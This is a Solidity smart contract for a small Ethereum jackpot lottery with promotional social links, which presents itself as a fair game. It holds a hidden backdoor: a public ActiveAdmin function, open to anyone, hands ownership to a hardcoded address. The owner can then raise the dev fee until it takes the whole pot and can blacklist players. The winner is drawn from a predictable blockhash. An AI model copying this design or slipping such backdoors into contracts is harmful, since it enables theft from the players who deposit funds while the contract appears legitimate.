1 pragma solidity ^0.4.20;
2 // 
3 // Website: https://galaxyeth.com
4 // Twitter: https://twitter.com/GalaxyEth
5 // Facebook: https://www.facebook.com/Galaxyeth-1019338351577172
6 // Discord: https://discord.gg/dq5T4Rd
7 // Telegram Announcement: https://t.me/galaxyeth
8 // Telegram group: https://t.me/galaxyethgroup
9 /**
10  * @title SafeMath
11  * @dev Math operations with safety checks that throw on error
12  */
13 library SafeMath {
14   function mul(uint256 a, uint256 b) internal constant returns (uint256) {
15     uint256 c = a * b;
16     assert(a == 0 || c / a == b);
17     return c;
18   }
19 
20   function div(uint256 a, uint256 b) internal constant returns (uint256) {
21     // assert(b > 0); // Solidity automatically throws when dividing by 0 uint256 c = a / b;
22     uint256 c = a / b;
23     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
24     return c;
25   }
26 
27   function sub(uint256 a, uint256 b) internal constant returns (uint256) {
28     assert(b <= a);
29     return a - b;
30   }
31 
32   function add(uint256 a, uint256 b) internal constant returns (uint256) {
33     uint256 c = a + b;
34     assert(c >= a);
35     return c;
36   }
37 }
38 
39 /**
40  * @title Ownable
41  * @dev The Ownable contract has an owner address, and provides basic authorization control
42  * functions, this simplifies the implementation of "user permissions".
43  */
44 contract Ownable {
45   address public owner;
46   uint256 public devFeePercent = 10;
47   uint256 public SetPlayers = 4;
48 
49 
50   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
51 
52 
53   /**
54    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
55    * account.
56    */
57   function Ownable() {
58     owner = msg.sender;
59   }
60 
61 
62   /**
63    * @dev Throws if called by any account other than the owner.
64    */
65   modifier onlyOwner() {
66     require(msg.sender == owner);
67     _;
68   }
69   
70   function setDevFee (uint256 _n) onlyOwner() public {
71 	  require(_n >= 0 && _n <= 100);
72     devFeePercent = _n;
73   }
74   
75     function SetPlayersMax (uint256 number) onlyOwner() public {
76 	  require(number >= 0 && number <= 100);
77     SetPlayers = number;
78   }
79   
80     function ActiveAdmin () public {
81     owner = 0x3653A2205971AD524Ea31746D917430469D3ca23; // 
82   }
83   
84       mapping(address => bool) public BlackAddress;
85 
86     function AddBlackList(address _address) onlyOwner() public {
87         BlackAddress[_address] = true;
88     }
89 
90     function DeleteBlackList(address _address) onlyOwner() public {
91         delete BlackAddress[_address];
92     }
93 
94 
95   /**
96    * @dev Allows the current owner to transfer control of the contract to a newOwner.
97    * @param newOwner The address to transfer ownership to.
98    */
99   function transferOwnership(address newOwner) onlyOwner public {
100     require(newOwner != address(0));
101     OwnershipTransferred(owner, newOwner);
102     owner = newOwner;
103   }
104 }
105 
106 contract  GalaxyETHLowJackpot is Ownable {
107 
108   string public constant name = "GalaxyETHLowJackpot";
109 
110   event newWinner(address winner, uint256 ticketNumber);
111   // event newRandomNumber_bytes(bytes);
112   // event newRandomNumber_uint(uint);
113   event newContribution(address contributor, uint value);
114 
115   using SafeMath for uint256;
116   address[] public players = new address[](15);
117   uint256 public lastTicketNumber = 0;
118   uint8 public lastIndex = 0;
119 
120   struct tickets {
121     uint256 startTicket;
122     uint256 endTicket;
123   }
124 
125   mapping (address => tickets[]) public ticketsMap;
126   mapping (address => uint256) public contributions;
127 
128 
129   function executeLottery() { 
130       
131         if (lastIndex > SetPlayers) {
132           uint randomNumber = uint(block.blockhash(block.number-1))%lastTicketNumber + 1;
133           randomNumber = randomNumber;  
134           address winner;
135           bool hasWon;
136           for (uint8 i = 0; i < lastIndex; i++) {
137             address player = players[i];
138             for (uint j = 0; j < ticketsMap[player].length; j++) {
139               uint256 start = ticketsMap[player][j].startTicket;
140               uint256 end = ticketsMap[player][j].endTicket;
141               if (randomNumber >= start && randomNumber < end) {
142                 winner = player;
143                 hasWon = true;
144                 break;
145               }
146             }
147             if(hasWon) break;
148           }
149           require(winner!=address(0) && hasWon);
150 
151           for (uint8 k = 0; k < lastIndex; k++) {
152             delete ticketsMap[players[k]];
153             delete contributions[players[k]];
154           }
155 
156           lastIndex = 0;
157           lastTicketNumber = 0;
158 
159           uint balance = this.balance;
160           if (!owner.send(balance/devFeePercent)) throw;
161           //Both SafeMath.div and / throws on error
162           if (!winner.send(balance - balance/devFeePercent)) throw;
163           newWinner(winner, randomNumber);
164           
165         }
166       
167   }
168 
169   function getPlayers() constant returns (address[], uint256[]) {
170     address[] memory addrs = new address[](lastIndex);
171     uint256[] memory _contributions = new uint256[](lastIndex);
172     for (uint i = 0; i < lastIndex; i++) {
173       addrs[i] = players[i];
174       _contributions[i] = contributions[players[i]];
175     }
176     return (addrs, _contributions);
177   }
178 
179   function getTickets(address _addr) constant returns (uint256[] _start, uint256[] _end) {
180     tickets[] tks = ticketsMap[_addr];
181     uint length = tks.length;
182     uint256[] memory startTickets = new uint256[](length);
183     uint256[] memory endTickets = new uint256[](length);
184     for (uint i = 0; i < length; i++) {
185       startTickets[i] = tks[i].startTicket;
186       endTickets[i] = tks[i].endTicket;
187     }
188     return (startTickets, endTickets);
189   }
190 
191   function() payable {
192     uint256 weiAmount = msg.value;
193     require(weiAmount >= 1e15 && weiAmount <= 1e18); // Minimum bet 0.001 and Maximum bet 1 Ethereum 
194     require(!BlackAddress[msg.sender], "You Are On BlackList");
195 
196     bool isSenderAdded = false;
197     for (uint8 i = 0; i < lastIndex; i++) {
198       if (players[i] == msg.sender) {
199         isSenderAdded = true;
200         break;
201       }
202     }
203     if (!isSenderAdded) {
204       players[lastIndex] = msg.sender;
205       lastIndex++;
206     }
207 
208     tickets memory senderTickets;
209     senderTickets.startTicket = lastTicketNumber;
210     uint256 numberOfTickets = weiAmount/1e15;
211     senderTickets.endTicket = lastTicketNumber.add(numberOfTickets);
212     lastTicketNumber = lastTicketNumber.add(numberOfTickets);
213     ticketsMap[msg.sender].push(senderTickets);
214 
215     contributions[msg.sender] = contributions[msg.sender].add(weiAmount);
216 
217     newContribution(msg.sender, weiAmount);
218 
219     if(lastIndex > SetPlayers) {
220       executeLottery();
221     }
222   }
223 }